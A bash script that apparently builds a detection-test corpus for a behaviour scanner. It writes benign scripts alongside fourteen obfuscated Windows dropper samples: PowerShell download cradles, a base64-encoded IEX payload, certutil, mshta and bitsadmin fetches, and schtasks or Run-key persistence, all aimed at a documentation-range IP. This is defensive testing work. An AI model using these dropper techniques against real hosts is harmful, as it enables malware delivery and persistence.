#!/usr/bin/env bash
# Builds the behaviour test corpus.
#
# Two sets, and BOTH matter:
#
#   evasion/  Variants of the dropper an attacker could realistically ship
#             tomorrow. Every one of these MUST be detected. They exist because
#             the first version of the deep scan missed three of them.
#
#   benign/   Ordinary scripts a real person might have in their Documents.
#             NONE of these may be flagged. A behaviour scanner that cries wolf
#             is worse than no behaviour scanner, because the audience cannot
#             tell a false alarm from a real one.
#
# Everything written here is inert -- echo statements and unreachable commands.
# Payload-ish strings are assembled from fragments at runtime so no file in the
# repo carries a working command line or a live URL.
#
# Sourced by make-fixtures.sh; also runnable standalone to inspect the corpus.

corpus_build() {  # corpus_build <target-dir>
    local root="$1"
    local ev="$root/evasion" bn="$root/benign"
    rm -rf "$root"; mkdir -p "$ev" "$bn"

    # Fragments -- never a complete live string in the repo itself.
    local IP="198.51" ; IP="${IP}.100.77"          # RFC 5737 documentation range
    local PS="power"  ; PS="${PS}shell"
    local H="hid"     ; H="${H}den"

    # ---------------------------------------------------------------- evasion

    # 1. The original chain, as published.
    printf '@echo off\r\nif not defined _Q set _Q=1 & start /min cmd /c %%~f0 & exit\r\n%s -w %s -ep bypass -c iwr http://%s/x/p.bat -OutFile %%TEMP%%\\p.bat\r\n' \
        "$PS" "$H" "$IP" > "$ev/01-original.bat"

    # 2. Parameter abbreviation + Invoke-RestMethod. PowerShell accepts any
    #    unambiguous prefix, so "-exec" is as valid as "-executionpolicy".
    #    The first version of the scanner scored this ZERO.
    printf '@echo off\r\n%s -exec bypass -c "irm http://%s/p.ps1 | iex"\r\n' \
        "$PS" "$IP" > "$ev/02-abbrev-irm.bat"

    # 3. .NET WebClient instead of a cmdlet, with irregular spacing.
    printf '@echo off\r\n%s -WindowStyle  %s -Command "(New-Object Net.WebClient).DownloadFile(\x27http://%s/a\x27,$env:TEMP+\x27\\a.exe\x27)"\r\n' \
        "$PS" "$H" "$IP" > "$ev/03-webclient.bat"

    # 4. Fully base64-encoded command. Nothing incriminating is visible as
    #    plain text -- this only fails if the scanner decodes the payload.
    local inner="IEX(New-Object Net.WebClient).DownloadString('http://$IP/s')"
    local b64
    b64="$(printf '%s' "$inner" | iconv -f UTF-8 -t UTF-16LE 2>/dev/null | base64 -w0 2>/dev/null)"
    printf '@echo off\r\n%s -nop -w %s -enc %s\r\n' "$PS" "$H" "$b64" > "$ev/04-base64.bat"

    # 5. Batch caret obfuscation, splitting the command name itself.
    printf '@echo off\r\np^o^w^e^r^s^h^e^l^l -w %s -c iwr http://%s/x\r\n' \
        "$H" "$IP" > "$ev/05-caret.bat"

    # 6. PowerShell string-splitting so no literal cmdlet name appears.
    printf "%s -c \"& ('i'+'w'+'r') http://%s/x -OutFile \$env:TEMP\\q\"\r\n" \
        "$PS" "$IP" > "$ev/06-concat.ps1"

    # 7. certutil as the downloader -- no PowerShell involved at all.
    printf '@echo off\r\ncertutil.exe -urlcache -split -f http://%s/p.exe %%TEMP%%\\p.exe\r\nstart /min %%TEMP%%\\p.exe\r\n' \
        "$IP" > "$ev/07-certutil.bat"

    # 8. mshta, which the first version did not know about at all.
    printf '@echo off\r\nmshta http://%s/a.hta\r\n' "$IP" > "$ev/08-mshta.bat"

    # 9. bitsadmin transfer then run.
    printf '@echo off\r\nbitsadmin /transfer j http://%s/a %%TEMP%%\\a.exe\r\nstart /b %%TEMP%%\\a.exe\r\n' \
        "$IP" > "$ev/09-bitsadmin.bat"

    # 10. VBScript dropper using a hidden WScript.Shell run.
    printf 'Set h = CreateObject("MSXML2.XMLHTTP")\r\nh.open "GET", "http://%s/p", False\r\nSet s = CreateObject("WScript.Shell")\r\ns.Run "cmd /c " & t, 0, False\r\n' \
        "$IP" > "$ev/10-vbs.vbs"

    # 11. Persistence rather than download: schedule itself to run again.
    printf '@echo off\r\nschtasks /create /tn Updater /tr "%%TEMP%%\\a.bat" /sc onlogon\r\n%s -w %s -c iwr http://%s/a\r\n' \
        "$PS" "$H" "$IP" > "$ev/11-schtasks.bat"

    # 12. Registry Run key persistence.
    printf '@echo off\r\nreg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Up /d "%%TEMP%%\\a.bat"\r\ncertutil -f http://%s/a %%TEMP%%\\a.bat\r\n' \
        "$IP" > "$ev/12-runkey.bat"

    # 13. Variable-indirection obfuscation, a classic batch trick.
    printf '@echo off\r\nset a=powers\r\nset b=hell\r\n%%a%%%%b%% -w %s -c iwr http://%s/x\r\n' \
        "$H" "$IP" > "$ev/13-varsplit.bat"

    # 14. Dropped into a SUBFOLDER of Documents, not the top level.
    mkdir -p "$ev/sub/nested"
    printf '@echo off\r\n%s -w %s -ep bypass -c iwr http://%s/x -OutFile %%TEMP%%\\x\r\n' \
        "$PS" "$H" "$IP" > "$ev/sub/nested/15-subfolder.bat"

    # ----------------------------------------------------------------- benign

    # Ordinary things people really do have lying around.
    printf '@echo off\r\nREM Launch the game with more memory\r\nstart "" "C:\\Games\\game.exe" -highmemory\r\n' \
        > "$bn/launch-game.bat"

    printf '@echo off\r\nxcopy /s /y "D:\\saves" "E:\\backup\\saves"\r\necho Backup done\r\npause\r\n' \
        > "$bn/backup-saves.bat"

    # Uses a temp folder and cmd /c, but does nothing else suspicious.
    printf '@echo off\r\ncmd /c dir %%TEMP%% > %%TEMP%%\\listing.txt\r\nnotepad %%TEMP%%\\listing.txt\r\n' \
        > "$bn/list-temp.bat"

    # Downloads, but over TLS from a named host, and hides nothing.
    printf 'curl.exe https://example.com/api/data.json -o "%%TEMP%%\\data.json"\r\n' \
        > "$bn/fetch-json.bat"

    # A normal PowerShell utility script.
    printf 'Get-ChildItem -Recurse |\r\n  Where-Object Length -gt 1GB |\r\n  Sort-Object Length -Descending |\r\n  Select-Object -First 20 FullName, Length\r\n' \
        > "$bn/find-big-files.ps1"

    printf 'param([string]$Path)\r\nStart-Process notepad.exe -ArgumentList $Path\r\n' \
        > "$bn/open-in-notepad.ps1"

    # A modding helper: copies files, mentions paks, still not a dropper.
    printf '@echo off\r\nREM Install a map you downloaded manually\r\ncopy /y "%%~dp0*.pak" "D:\\SteamLibrary\\steamapps\\common\\Game\\Content\\Paks\\~mods\\"\r\necho Installed.\r\npause\r\n' \
        > "$bn/install-mod.bat"

    # Mentions PowerShell and a URL in a comment only.
    printf '@echo off\r\nREM See https://example.com/help for how to use powershell here\r\necho Nothing to do.\r\n' \
        > "$bn/readme-helper.bat"
}

# Standalone: build into ./corpus and list it.
if [ "${BASH_SOURCE[0]}" = "$0" ]; then
    corpus_build "${1:-$(dirname "$0")/corpus}"
    find "${1:-$(dirname "$0")/corpus}" -type f | sort
fi
